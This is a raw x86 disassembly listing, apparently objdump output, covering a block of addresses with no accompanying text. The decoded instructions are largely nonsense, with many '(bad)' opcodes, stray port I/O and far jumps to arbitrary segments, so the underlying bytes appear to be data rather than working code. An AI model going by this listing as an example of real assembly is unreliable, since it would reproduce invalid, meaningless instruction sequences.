  416b0c:	add    esp,DWORD PTR [edi+edi*2]
  416b0f:	push   es
  416b10:	(bad)  
  416b12:	mov    edx,0x844f4f69
  416b17:	dec    esi
  416b18:	ss leave 
  416b1a:	scas   eax,DWORD PTR es:[edi]
  416b1b:	pop    ss
  416b1c:	iret   
  416b1d:	mov    dl,0x13
  416b1f:	dec    esp
  416b20:	cli    
  416b21:	mov    esp,edx
  416b23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b24:	jb     0x416b36
  416b26:	mov    bl,0x84
  416b28:	adc    al,BYTE PTR [eax-0xf]
  416b2b:	pushf  
  416b2c:	mov    ebp,ebx
  416b2e:	fstp   TBYTE PTR [ecx-0x6f]
  416b31:	inc    ebx
  416b32:	push   ss
  416b33:	jns    0x416b6a
  416b35:	push   ss
  416b36:	in     eax,0xfb
  416b38:	sub    esi,edx
  416b3a:	shl    esi,1
  416b3c:	popa   
  416b3d:	mov    ch,0x67
  416b3f:	push   edi
  416b40:	ins    DWORD PTR es:[edi],dx
  416b41:	jb     0x416bb5
  416b43:	std    
  416b44:	scas   al,BYTE PTR es:[edi]
  416b45:	shl    DWORD PTR [edx-0x2b8db59e],cl
  416b4b:	aas    
  416b4c:	and    esi,esp
  416b4e:	repz pushf 
  416b50:	(bad)  
  416b51:	and    edi,esi
  416b53:	or     bl,0x32
  416b56:	inc    esp
  416b57:	cld    
  416b58:	ss dec eax
  416b5a:	aad    0x74
  416b5c:	jg     0x416b52
  416b5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b5f:	out    0xa,eax
  416b61:	jb     0x416afa
  416b63:	es stc 
  416b65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b66:	pop    ss
  416b67:	sub    dl,BYTE PTR [ebx+0x64115da0]
  416b6d:	dec    ecx
  416b6e:	clc    
  416b6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b70:	push   ss
  416b71:	or     BYTE PTR [edx+0x5a35a5b7],ch
  416b77:	jmp    0xaef2:0x5804cab1
  416b7e:	mov    edx,0xa55fa73a
  416b83:	cmp    bh,dl
  416b85:	fsub   DWORD PTR [esi+edx*8-0x3c]
  416b89:	aaa    
  416b8a:	adc    cl,0x94
  416b8d:	icebp  
  416b8e:	loopne 0x416b78
  416b90:	aaa    
  416b91:	xchg   esp,eax
  416b92:	out    dx,al
  416b93:	xchg   ebx,eax
  416b94:	xor    ah,al
  416b96:	(bad)  
  416b97:	push   eax
  416b98:	push   0x0
  416b9a:	sub    ah,cl
  416b9c:	mov    ah,0x39
  416b9e:	(bad)  
  416b9f:	pop    edx
  416ba0:	jbe    0x416bd5
  416ba2:	inc    esi
  416ba3:	and    esi,esi
  416ba5:	add    eax,0x22314261
  416baa:	sahf   
  416bab:	xchg   edx,eax
  416bac:	push   cs
  416bad:	repz pop ds
  416baf:	mov    ecx,0x3647ae2
  416bb4:	scas   al,BYTE PTR es:[edi]
  416bb5:	add    ebx,ecx
  416bb7:	jle    0x416be5
  416bb9:	push   0xbb36480f
  416bbe:	dec    ecx
  416bbf:	pop    ds
  416bc0:	arpl   WORD PTR [ecx-0xb],dx
  416bc3:	push   eax
  416bc4:	sbb    eax,0xcae8476c
  416bc9:	data16 jp 0x416b73
  416bcc:	add    DWORD PTR [ebx],eax
  416bce:	in     al,dx
  416bcf:	test   eax,esp
  416bd1:	pop    esi
  416bd2:	loop   0x416bb5
  416bd4:	repnz push ecx
  416bd6:	adc    ch,BYTE PTR [edx-0x69]
  416bd9:	je     0x416bca
  416bdb:	hlt    
  416bdc:	pop    esi
  416bdd:	xor    ah,cl
  416bdf:	outs   dx,BYTE PTR ds:[esi]
  416be0:	pusha  
  416be1:	std    
  416be2:	ss xchg ebp,eax
  416be4:	or     bl,bl
  416be6:	pop    edx
  416be7:	sbb    bl,BYTE PTR [edx+esi*2-0x7cd156dc]
  416bee:	add    esp,DWORD PTR [ecx-0x2c319a39]
  416bf4:	ror    DWORD PTR [edi-0x3a],cl
  416bf7:	leave  
  416bf8:	xchg   esp,eax
  416bf9:	je     0x416bef
  416bfb:	xchg   edx,eax
  416bfc:	push   ebx
  416bfd:	stc    
  416bfe:	fdivr  QWORD PTR [ebx+0x6a6ccf45]
  416c04:	clc    
  416c05:	push   ebx
  416c06:	popa   
  416c07:	push   0xfb4339eb
  416c0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c0d:	mov    DWORD PTR [edi-0x19],esp
  416c10:	lahf   
  416c11:	scas   al,BYTE PTR es:[edi]
  416c12:	enter  0xe1,0x64
  416c16:	iret   
  416c17:	(bad)  
  416c18:	mov    ds:0x3686a7d1,eax
  416c1d:	scas   al,BYTE PTR es:[edi]
  416c1e:	scas   eax,DWORD PTR es:[edi]
  416c1f:	outs   dx,DWORD PTR ds:[esi]
  416c20:	mov    esi,0x36149467
  416c25:	xor    BYTE PTR [ebx],al
  416c27:	push   esi
  416c28:	push   esp
  416c29:	mov    edi,0x87713131
  416c2e:	cmc    
  416c2f:	push   es
  416c30:	fstp   TBYTE PTR [edi]
  416c32:	daa    
  416c33:	outs   dx,DWORD PTR ds:[esi]
  416c34:	out    dx,eax
  416c35:	inc    ebx
  416c36:	xchg   edi,eax
  416c37:	jle    0x416c11
  416c39:	add    edi,DWORD PTR [ebx-0x6375e1f1]
  416c3f:	inc    esi
  416c40:	mov    DWORD PTR fs:[ecx-0x7e],esp
  416c44:	int3   
  416c45:	inc    ebx
  416c46:	bound  edx,QWORD PTR [eax+0x22]
  416c49:	push   ebp
  416c4a:	or     cl,dl
  416c4c:	adc    eax,0xffffffb8
  416c4f:	or     BYTE PTR [esi-0x54a2e143],ah
  416c55:	fld    TBYTE PTR [ebx+0x63]
  416c58:	outs   dx,BYTE PTR ds:[esi]
  416c59:	cmp    BYTE PTR [esi],cl
  416c5b:	cs aad 0xc5
  416c5e:	fcompp 
  416c60:	mov    bh,0x3f
  416c62:	push   ecx
  416c63:	add    edi,DWORD PTR [eax+0x7f]
  416c66:	sbb    eax,esp
  416c68:	xor    eax,0xc135f7bc
  416c6d:	into   
  416c6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c6f:	lock cmp al,0xff
  416c72:	cli    
  416c73:	test   DWORD PTR [esi+0x3a],ebx
  416c76:	fst    DWORD PTR [edi-0x3f]
  416c79:	aad    0xeb
  416c7b:	or     eax,0xce89fd55
  416c80:	mov    cl,0x9a
  416c82:	sbb    DWORD PTR [ebp*2-0x4b4a69f0],0xe
  416c8a:	(bad)  
  416c8b:	push   esp
  416c8c:	jb     0x416c95
  416c8e:	mov    ch,bh
  416c90:	jbe    0x416cb2
  416c92:	add    ah,ch
  416c94:	(bad)  
  416c95:	jg     0x416c9e
  416c97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c98:	loope  0x416c54
  416c9a:	push   ebp
  416c9b:	mov    eax,ds:0x45c7365f
  416ca0:	test   al,0xcc
  416ca2:	pushf  
  416ca3:	enter  0xa373,0x1e
  416ca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ca8:	pop    ss
  416ca9:	push   ss
  416caa:	test   al,0xef
  416cac:	fwait
  416cad:	ret    
  416cae:	mov    ebx,0x5c1bf10a
  416cb3:	adc    edx,ebx
  416cb5:	sahf   
  416cb6:	hlt    
  416cb7:	in     eax,dx
  416cb8:	jg     0x416c4b
  416cba:	mov    ebx,0x9b173f1
  416cbf:	fwait
  416cc0:	cwde   
  416cc1:	dec    ebx
  416cc2:	fwait
  416cc3:	mov    dl,0xfb
  416cc5:	adc    ebp,DWORD PTR [edi+eiz*2]
  416cc8:	jbe    0x416cee
  416cca:	push   eax
  416ccb:	aam    0xd6
  416ccd:	mov    ss,WORD PTR [esi-0x3c]
  416cd0:	sbb    ebx,0x42
  416cd3:	and    edi,DWORD PTR [edx-0x13]
  416cd6:	mov    eax,0x53e6e127
  416cdb:	sbb    BYTE PTR cs:[ebp+0x6e],cl
  416cdf:	mov    eax,ds:0xbad58ddc
  416ce4:	loop   0x416c82
  416ce6:	xor    edi,edx
  416ce8:	jp     0x416d66
  416cea:	clc    
  416ceb:	cs add ecx,ebp
  416cee:	xchg   esp,eax
  416cef:	cli    
  416cf0:	pop    esi
  416cf1:	add    DWORD PTR [edi-0x17],ebp
  416cf4:	popf   
  416cf5:	mov    eax,ds:0x98d03ff5
  416cfa:	ds repnz mov al,0x8
  416cfe:	fsubr  DWORD PTR [esi-0xb]
  416d01:	mov    edi,0x7f61e5f9
  416d06:	mov    ?,WORD PTR [bx+0x642c]
  416d0b:	mov    WORD PTR [ecx],?
  416d0d:	fisttp WORD PTR [ebx]
  416d0f:	sbb    DWORD PTR [edi],ebx
  416d11:	sar    DWORD PTR [esi+esi*8-0x66b14573],1
  416d18:	mov    esp,0x7606d82a
  416d1d:	call   esi
  416d1f:	shufps xmm3,XMMWORD PTR [esi-0x77448b65],0xe7
  416d27:	mov    cl,0xa2
  416d29:	int3   
  416d2a:	aaa    
  416d2b:	ins    DWORD PTR es:[edi],dx
  416d2c:	sub    al,0x2d
  416d2e:	stos   DWORD PTR es:[edi],eax
  416d2f:	ret    0x99b2
  416d32:	xchg   BYTE PTR [ebx-0x5f0d8ea0],cl
  416d38:	pop    ebx
  416d39:	fistp  DWORD PTR [esp+ecx*1]
  416d3c:	jne    0x416d52
  416d3e:	jle    0x416cd0
  416d40:	stos   BYTE PTR es:[edi],al
  416d41:	sbb    dh,BYTE PTR [eax+0x78ae2b39]
  416d47:	xor    edi,eax
  416d49:	cdq    
  416d4a:	adc    BYTE PTR [ecx+0x535275],dh
  416d50:	xor    BYTE PTR [edx],bl
  416d52:	mov    al,ds:0x7b088a03
  416d57:	retf   0xd7e4
  416d5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d5b:	mov    esp,DWORD PTR [esi+edx*2+0x3a]
  416d5f:	xor    BYTE PTR gs:[edi+0x3d68b7d5],dl
  416d66:	dec    ebx
  416d67:	push   ebx
  416d68:	div    cl
  416d6a:	in     eax,0xdf
  416d6c:	and    esi,DWORD PTR [ebp-0x25fd6c7d]
  416d72:	daa    
  416d73:	(bad)  
  416d74:	test   al,0x3
  416d76:	jmp    0x416db7
  416d78:	fst    DWORD PTR [edi-0x53]
  416d7b:	loope  0x416d7b
  416d7d:	pusha  
  416d7e:	stos   DWORD PTR es:[edi],eax
  416d7f:	cdq    
  416d80:	mov    edi,0xaceb352a
  416d85:	push   0xd88eebfb
  416d8a:	bound  ebx,QWORD PTR [eax-0x1a]
  416d8d:	mov    ch,0x48
  416d8f:	test   DWORD PTR [edi],0x69c5e4f5
  416d95:	adc    eax,0x5a444f16
  416d9a:	jg     0x416d59
  416d9c:	jne    0x416d53
  416d9e:	sti    
  416d9f:	sub    al,0xf4
  416da1:	lods   eax,DWORD PTR ds:[esi]
  416da2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416da3:	in     al,dx
  416da4:	push   ecx
  416da5:	inc    eax
  416da6:	rcl    BYTE PTR [ebp-0x43],cl
  416da9:	push   edx
  416daa:	sub    esp,ebx
  416dac:	jb     0x416e2d
  416dae:	shl    DWORD PTR [ecx+ebp*1],cl
  416db1:	aam    0xb8
  416db3:	pushf  
  416db4:	mov    eax,ds:0xb0a93ad3
  416db9:	test   BYTE PTR [ebp+0x6aa4aa72],dl
  416dbf:	jne    0x416de0
  416dc1:	and    ah,dl
  416dc3:	ins    DWORD PTR es:[edi],dx
  416dc4:	scas   eax,DWORD PTR es:[edi]
  416dc5:	mov    ebp,0xa3104047
  416dca:	(bad)  
  416dcb:	daa    
  416dcc:	inc    ebp
  416dcd:	jge    0x416d78
  416dcf:	stos   DWORD PTR es:[edi],eax
  416dd0:	imul   edi,DWORD PTR [eax],0x0
  416dd3:	fwait
  416dd4:	xor    eax,0x79797ca7
  416dd9:	xchg   ebp,eax
  416dda:	xchg   ebp,eax
  416ddb:	cmc    
  416ddc:	jne    0x416e55
  416dde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ddf:	int    0x0
  416de1:	inc    esp
  416de2:	dec    edx
  416de3:	mov    ch,dl
  416de5:	aas    
  416de6:	fs enter 0xaef5,0x1e
  416deb:	add    BYTE PTR [ecx-0x62709971],bl
  416df1:	daa    
  416df2:	adc    DWORD PTR [edx-0x7d418ee5],esp
  416df8:	push   ss
  416df9:	xchg   esp,eax
  416dfa:	(bad)  
  416dfb:	(bad)  
  416dfc:	mov    ecx,0xc7a07b41
  416e01:	ins    BYTE PTR es:[edi],dx
  416e02:	into   
  416e03:	jp     0x416daf
  416e05:	or     BYTE PTR [ecx-0x12],dh
  416e08:	add    DWORD PTR [edi],edx
  416e0a:	test   al,0x8f
  416e0c:	scas   eax,DWORD PTR es:[edi]
  416e0d:	xor    edx,DWORD PTR [ebx-0x1689c1a7]
  416e13:	mov    ecx,DWORD PTR [esi]
  416e15:	add    dl,BYTE PTR [ecx+0x6973b101]
  416e1b:	mov    esi,0xa8d1718f
  416e20:	jbe    0x416de2
  416e22:	mov    bl,0xe4
  416e24:	adc    eax,0xc26f0807
  416e29:	mov    ch,0x6b
  416e2b:	jp     0x416db2
  416e2d:	sti    
  416e2e:	push   0x2
  416e30:	cld    
  416e31:	outs   dx,BYTE PTR ds:[esi]
  416e32:	stc    
  416e33:	jae    0x416dfa
  416e35:	sbb    dl,BYTE PTR [ebx-0x1ea3726e]
  416e3b:	cli    
  416e3c:	pushf  
  416e3d:	lahf   
  416e3e:	jmp    0x8c92aaa2
  416e43:	jle    0x416e81
  416e45:	inc    ebx
  416e46:	mov    cl,0x5
  416e48:	retf   0x85f
  416e4b:	jg     0x416e16
  416e4d:	sbb    al,BYTE PTR [edx]
  416e4f:	jmp    0xe7b25079
  416e54:	xchg   edx,eax
  416e55:	add    al,0x70
  416e57:	jge    0x416e56
  416e59:	inc    esp
  416e5a:	push   ds
  416e5b:	aam    0x17
  416e5d:	sar    dh,cl
  416e5f:	xchg   BYTE PTR [ecx+0x70],bl
  416e62:	sbb    ebx,DWORD PTR [edx]
  416e64:	mov    edi,0x6a17eab4
  416e69:	call   0x908230ef
  416e6e:	imul   ebx,DWORD PTR [ebx-0x1621fdfd],0x473ae58c
  416e78:	jbe    0x416e7e
  416e7a:	repnz inc ecx
  416e7c:	or     BYTE PTR [ebx],cl
  416e7e:	jb     0x416e93
  416e80:	mov    esp,0xf882fddc
  416e85:	outs   dx,BYTE PTR ds:[esi]
  416e86:	push   ecx
  416e87:	push   ebp
  416e88:	jmp    0x24ab:0x94b848d5
  416e8f:	ins    DWORD PTR es:[edi],dx
  416e90:	mov    bh,0x4c
  416e92:	cmp    BYTE PTR [ebp-0x76],bh
  416e95:	dec    eax
  416e96:	lods   al,BYTE PTR ds:[esi]
  416e97:	jne    0x416e70
  416e99:	xchg   ebp,eax
  416e9a:	dec    ebx
  416e9b:	pop    edi
  416e9c:	xor    al,0xef
  416e9e:	leave  
  416e9f:	mov    ah,0x5f
  416ea1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ea2:	out    0xf,eax
  416ea4:	adc    ebx,edx
  416ea6:	cdq    
  416ea7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ea8:	and    al,dl
  416eaa:	int3   
  416eab:	hlt    
  416eac:	out    0xad,eax
  416eae:	je     0x416ead
  416eb0:	(bad)  
  416eb1:	and    al,0x5e
  416eb3:	and    ebp,ecx
  416eb5:	push   ds
  416eb6:	inc    ebx
  416eb7:	sbb    BYTE PTR [edi+0x649d4f95],dh
  416ebd:	jb     0x416ea4
  416ebf:	sub    al,BYTE PTR [eax+0x9]
  416ec2:	xor    eax,0xc6018a4a
  416ec7:	repnz and eax,0x2a58f5ba
  416ecd:	cmp    bh,BYTE PTR [edi]
  416ecf:	jne    0x416ed6
  416ed1:	jle    0x416f0b
  416ed3:	pop    edx
  416ed4:	pop    ebx
  416ed5:	inc    esp
  416ed6:	es push 0x4a
  416ed9:	sub    ecx,DWORD PTR [ebx+0x6859692]
  416edf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ee0:	sbb    BYTE PTR [edi],0xd
  416ee3:	mov    ds:0x5d076457,al
  416ee8:	mov    BYTE PTR [eax-0x68],bl
  416eeb:	fmul   st(0),st
  416eed:	pop    cx
  416ef0:	or     al,0xcf
  416ef2:	jl     0x416ebe
  416ef4:	dec    edi
  416ef5:	sti    
  416ef6:	out    dx,eax
  416ef7:	sub    ecx,eax
  416ef9:	sub    DWORD PTR [esi],0xa8be55c9
  416eff:	xchg   ecx,eax
  416f00:	xor    edx,eax
  416f02:	sub    ecx,edx
  416f04:	sub    ecx,esi
  416f06:	jmp    0x41928f
  416f0b:	adc    ah,BYTE PTR [edx+0xe708f7]
  416f11:	test   BYTE PTR [eax+0x9a72d6],bl
  416f17:	mov    ds:0x93c77ccb,al
  416f1c:	inc    eax
  416f1d:	add    BYTE PTR [ebx-0x7c7ca3e9],0x1d
  416f24:	pop    edx
  416f25:	xor    ch,BYTE PTR [esp+ebx*8-0x7eee3138]
  416f2c:	push   es
  416f2d:	test   al,0x7d
  416f2f:	pop    eax
  416f30:	mov    esi,0xe78c5416
  416f35:	sbb    eax,0x3f10638e
  416f3a:	(bad)  
  416f3b:	push   ebp
  416f3c:	imul   edi,esi,0x15b2b5bb
  416f42:	jmp    0x416f7f
  416f44:	sub    esi,ecx
  416f46:	push   eax
  416f47:	add    BYTE PTR [eax],0xdd
  416f4a:	mov    al,ds:0xcb4d6664
  416f4f:	loope  0x416f12
  416f51:	jns    0x416f79
  416f53:	pop    esp
  416f54:	pop    esi
  416f55:	xor    al,0xfb
  416f57:	mov    edx,esi
  416f59:	fwait
  416f5a:	jae    0x416f3a
  416f5c:	mov    al,0xdb
  416f5e:	push   cs
  416f5f:	into   
  416f60:	dec    ebx
  416f61:	scas   eax,DWORD PTR es:[edi]
  416f62:	cmp    DWORD PTR [edx+0x26b3d17c],ebp
  416f68:	xor    DWORD PTR [ecx-0x31e07477],ecx
  416f6e:	mov    eax,0x4fdad12d
  416f73:	or     dh,BYTE PTR [ecx*2-0x1f7f0e01]
  416f7a:	cmp    esp,DWORD PTR [ebx+0x12]
  416f7d:	mov    ds:0x649a216a,eax
  416f82:	sbb    esi,DWORD PTR [ecx+ecx*8]
  416f85:	pop    ecx
  416f86:	js     0x416f7f
  416f88:	add    DWORD PTR [eax+0x48de4bb9],esi
  416f8e:	push   ss
  416f8f:	pop    eax
  416f90:	mov    eax,ds:0xdffe1e26
  416f95:	ss repnz mov esi,0xdf543d61
  416f9c:	les    eax,FWORD PTR [edx-0x24cbaa5]
  416fa2:	sbb    esi,DWORD PTR [eax-0x1c617a47]
  416fa8:	int3   
  416fa9:	jmp    0x416fad
  416fab:	mov    bh,BYTE PTR [esi]
  416fad:	(bad)  
  416fae:	fiadd  DWORD PTR [eax-0x3a7d9136]
  416fb4:	rcr    ecx,1
  416fb6:	sbb    BYTE PTR [ebp+0x3cf7d418],dh
  416fbc:	outs   dx,BYTE PTR ds:[esi]
  416fbd:	and    BYTE PTR ds:0x5e12530a,0x54
  416fc4:	mov    bh,0x8
  416fc6:	test   esp,esi
  416fc8:	jp     0x416f5b
  416fca:	shr    cl,cl
  416fcc:	mov    esp,0xc890b947
  416fd1:	pop    eax
  416fd2:	lods   eax,DWORD PTR ds:[esi]
  416fd3:	sbb    DWORD PTR [ebx],esi
  416fd5:	fidiv  WORD PTR [eax]
  416fd7:	cld    
  416fd8:	mov    bl,0x6f
  416fda:	cmp    al,BYTE PTR [edi-0x62]
  416fdd:	and    DWORD PTR [ebp+0x2c],ebp
  416fe0:	fcom   QWORD PTR [edx+0x6cd8c632]
  416fe6:	jns    0x41702b
  416fe8:	jae    0x416fc8
  416fea:	mov    eax,ds:0x84e1d87a
  416fef:	scas   al,BYTE PTR es:[edi]
  416ff0:	mov    ebp,0xba16e50a
  416ff5:	lahf   
  416ff6:	retf   0xcdf7
  416ff9:	in     al,0x87
  416ffb:	ret    
  416ffc:	sub    al,0x66
  416ffe:	jae    0x416ff9
  417000:	jp     0x416fee
  417002:	aad    0xf0
  417004:	mov    dh,0x61
  417006:	jbe    0x416faf
  417008:	test   eax,0x20ac7eac
  41700d:	ficom  DWORD PTR [edi+0x7]
  417010:	aam    0xd0
  417012:	bound  esp,QWORD PTR [ecx-0x7b58af82]
  417018:	cmp    eax,0xf5c97838
  41701d:	mov    al,ds:0x34d947c2
  417022:	enter  0x5b8b,0x3
  417026:	adc    BYTE PTR [edx-0x350ff640],cl
  41702c:	test   edx,ecx
  41702e:	inc    ebx
  41702f:	push   ss
  417030:	enter  0xcb01,0xad
  417034:	or     esi,DWORD PTR [ecx+esi*1+0x61]
  417038:	call   0xb92a:0x33eb1209
  41703f:	retf   
  417040:	push   esi
  417041:	mov    bl,0xfd
  417043:	cwde   
  417044:	dec    edi
  417045:	push   ebx
  417046:	in     al,dx
  417047:	call   0x444b:0x635b1f2d
  41704e:	inc    ebx
  41704f:	mov    dl,0xb3
  417051:	add    BYTE PTR [esi+0x30],al
  417054:	dec    edx
  417055:	xchg   esi,eax
  417056:	jmp    0x41705a
  417058:	std    
  417059:	aam    0xc7
  41705b:	pop    ebp
  41705c:	fucom  st(1)
  41705e:	rcl    BYTE PTR [eax-0x4261a256],cl
  417064:	add    DWORD PTR [esi-0x6b],ebp
  417067:	mov    bl,0xde
  417069:	in     eax,0xd9
  41706b:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41706d:	xor    DWORD PTR cs:[edi-0x4cffe272],ecx
  417074:	sahf   
  417075:	mov    esp,ss
  417077:	add    DWORD PTR [esi],edx
  417079:	(bad)  
  41707a:	pop    edi
  41707b:	in     eax,dx
  41707c:	cmp    DWORD PTR [edx-0x2dd120ff],ecx
  417082:	dec    ebx
  417083:	rcl    ebp,cl
  417085:	pop    ebp
  417086:	jp     0x41701f
  417088:	(bad)  
  417089:	shl    BYTE PTR [ebp+0x42],1
  41708c:	jno    0x4170fe
  41708e:	ja     0x417109
  417090:	xor    BYTE PTR [edi-0x1c1a4255],bl
  417096:	xchg   ecx,eax
  417097:	hlt    
  417098:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417099:	push   ebx
  41709a:	int    0xd6
  41709c:	push   edi
  41709d:	inc    esp
  41709e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41709f:	push   ebp
  4170a0:	out    0x0,eax
  4170a2:	jnp    0x417048
  4170a4:	mov    bh,0x67
  4170a6:	popf   
  4170a7:	icebp  
  4170a8:	dec    DWORD PTR ds:0x7141eae1
  4170ae:	mov    edi,0xf84947d0
  4170b3:	repnz cdq 
  4170b5:	xor    DWORD PTR ds:0x83e448a3,ecx
  4170bb:	push   cs
  4170bc:	repz (bad) 
  4170be:	pop    ecx
  4170bf:	int3   
  4170c0:	cmp    edx,ebp
  4170c2:	sub    al,0x3
  4170c4:	call   0x527f:0x171ac9cb
  4170cb:	cmp    BYTE PTR [eax],ah
  4170cd:	in     al,dx
  4170ce:	div    DWORD PTR [ecx-0x3d]
  4170d1:	repnz sbb ecx,DWORD PTR [ebx+0x21923911]
  4170d8:	loopne 0x41713e
  4170da:	pop    ecx
  4170db:	mov    ebp,0xc0dd4717
  4170e0:	jne    0x417150
  4170e2:	mov    al,ds:0xdb4c6cac
  4170e7:	mov    dl,0xf0
  4170e9:	mov    dl,0x72
  4170eb:	sti    
  4170ec:	mov    al,ds:0x60c29fab
  4170f1:	sbb    BYTE PTR [esi+0x6231b223],ah
  4170f7:	xchg   ebx,ebx
  4170f9:	push   ds
  4170fa:	cmp    cl,ch
  4170fc:	in     eax,dx
  4170fd:	cmp    BYTE PTR [edx-0x3d],dh
  417100:	push   esp
  417101:	jl     0x417138
  417103:	aas    
  417104:	xor    edx,esi
  417106:	aas    
  417107:	and    dh,BYTE PTR [ecx-0x12]
  41710a:	sbb    BYTE PTR [ebx],ah
  41710c:	or     al,0x5d
  41710e:	sbb    eax,0xea905b7b
  417113:	test   eax,0x5d650c97
  417118:	pusha  
  417119:	lods   eax,DWORD PTR ds:[esi]
  41711a:	outs   dx,BYTE PTR ds:[esi]
  41711b:	stos   BYTE PTR es:[edi],al
  41711c:	pop    ebp
  41711d:	cmp    eax,0xec7cac80
  417122:	fild   DWORD PTR [eax]
  417124:	ja     0x4170cb
  417126:	push   edx
  417127:	adc    DWORD PTR [edi-0x3fbfe00b],ebp
  41712d:	test   DWORD PTR [edx+0x4d],edi
  417130:	jle    0x4170e5
  417132:	cmp    bl,BYTE PTR [edx+0x1c]
  417135:	mov    esp,0x324419a5
  41713a:	rcl    WORD PTR [eax+0x5a],0xa2
  41713f:	mov    DWORD PTR [esi-0x5e],edx
  417142:	and    ah,BYTE PTR [eax-0x68]
  417145:	add    al,BYTE PTR [ebx+0x5489d90b]
  41714b:	stc    
  41714c:	dec    edx
  41714d:	add    DWORD PTR [eax],esi
  41714f:	sub    esi,DWORD PTR [ecx+0x34]
  417152:	push   ebx
  417153:	add    bl,BYTE PTR [esi+ecx*1]
  417156:	(bad)
  41715a:	adc    eax,DWORD PTR [edi]
  41715c:	mov    bh,0x7b
  41715e:	xchg   ebp,eax
  41715f:	add    DWORD PTR [eax],ecx
  417161:	mov    ecx,0xecf2f766
  417166:	out    0x70,al
  417168:	fs mov ebx,?
  41716b:	xchg   edi,eax
  41716c:	ror    ah,1
  41716e:	mov    BYTE PTR cs:[ecx-0x4076f86f],dl
  417175:	and    eax,0x93238dd1
  41717a:	sbb    BYTE PTR [eax+0x7d28e391],al
  417180:	je     0x417135
  417182:	adc    eax,0x481b5ad6
  417187:	push   ebx
  417188:	add    eax,0x9d8e7db
  41718d:	mov    WORD PTR [esi+0x3],ds
  417190:	dec    edi
  417191:	in     al,dx
  417192:	pop    edx
  417193:	adc    al,ch
  417195:	mov    al,0x5b
  417197:	mov    dl,0x6
  417199:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41719a:	push   esp
  41719b:	mov    ds:0xaa729f06,al
  4171a0:	stos   DWORD PTR es:[edi],eax
  4171a1:	mov    DWORD PTR [ecx],ebp
  4171a3:	fnstcw WORD PTR [edi+0x6f]
  4171a6:	xchg   edx,eax
  4171a7:	or     DWORD PTR [ebp+0x69],ebp
  4171aa:	enter  0x6c86,0x80
  4171ae:	sahf   
  4171af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171b0:	xor    cl,bl
  4171b2:	mov    edx,0x4a2f59db
  4171b7:	dec    esp
  4171b8:	push   esp
  4171b9:	mov    ecx,0x2fcec058
  4171be:	jbe    0x4171a9
  4171c0:	sub    DWORD PTR [eax-0x71],esp
  4171c3:	stos   BYTE PTR es:[edi],al
  4171c4:	jno    0x41716d
  4171c6:	pop    edi
  4171c7:	xchg   DWORD PTR [esi-0x3dd9cb9d],ebp
  4171cd:	adc    eax,0x8cedee28
  4171d2:	les    ebp,FWORD PTR [ecx-0x529f4768]
  4171d8:	pop    esi
  4171d9:	lock aas 
  4171db:	pop    esp
  4171dc:	inc    ebx
  4171dd:	nop
  4171de:	ss jno 0x417224
  4171e1:	xor    DWORD PTR [ebx+0x5982cb22],0xffffffe0
  4171e8:	leave  
  4171e9:	jmp    FWORD PTR [ebx-0x602663b0]
  4171ef:	adc    al,0x28
  4171f1:	bnd call 0x521ad2ef
  4171f7:	inc    ecx
  4171f9:	inc    ebp
  4171fa:	(bad)
  4171fd:	dec    ebx
  4171fe:	js     0x41725b
  417200:	fsubr  QWORD PTR [edx]
  417202:	call   FWORD PTR [edi-0x66]
  417205:	and    ah,ch
  417207:	sti    
  417208:	xchg   edi,eax
  417209:	push   esi
  41720a:	stc    
  41720b:	dec    ecx
  41720c:	push   es
  41720d:	mov    al,BYTE PTR [ebp+0x2310d6fe]
  417213:	pop    edx
  417214:	pushf  
  417215:	shl    BYTE PTR es:[edi+0x3c],0x0
  41721a:	daa    
  41721b:	(bad)  
  41721c:	daa    
  41721d:	hlt    
  41721e:	ficom  WORD PTR [eax-0x58]
  417221:	mov    cl,al
  417223:	mov    dl,0xce
  417225:	jb     0x417252
  417227:	scas   eax,DWORD PTR es:[edi]
  417228:	jge    0x4171c4
  41722a:	lea    esi,[ecx+0x6b]
  41722d:	mov    edx,ebx
  41722f:	pop    esi
  417230:	mov    ch,0x15
  417232:	(bad)  
  417233:	shr    DWORD PTR ds:0xfebbce16,cl
  417239:	hlt    
  41723a:	cli    
  41723b:	sbb    al,0x21
  41723d:	test   eax,0x13877de9
  417242:	imul   eax,DWORD PTR [eax-0x464ab230],0x3d1a2a86
  41724c:	into   
  41724d:	jecxz  0x4172af
  41724f:	adc    al,0x44
  417251:	jge    0x417211
  417253:	es cli 
  417255:	addr16 add al,0x2e
  417258:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417259:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41725a:	test   BYTE PTR [ebx],cl
  41725c:	xor    ah,BYTE PTR [ebp+esi*1+0x78c8f8f6]
  417263:	jo     0x4172d6
  417265:	mov    esi,0x9a3672e8
  41726a:	jmp    0x41722b
  41726c:	sub    eax,0xcdd7b576
  417271:	inc    esi
  417272:	(bad)  
  417273:	mov    eax,ds:0x66905a13
  417278:	and    bl,BYTE PTR [edi+ebp*4-0x3ca5c9f5]
  41727f:	jmp    0x4a8f:0x1c7675cd
  417286:	push   ebp
  417287:	jp     0x417262
  417289:	ret    0xd8e3
  41728c:	push   ecx
  41728d:	inc    ecx
  41728e:	push   ebx
  41728f:	adc    eax,0x3b27a99d
  417294:	cdq    
  417295:	cmp    dh,BYTE PTR ds:0xd483405d
  41729b:	hlt    
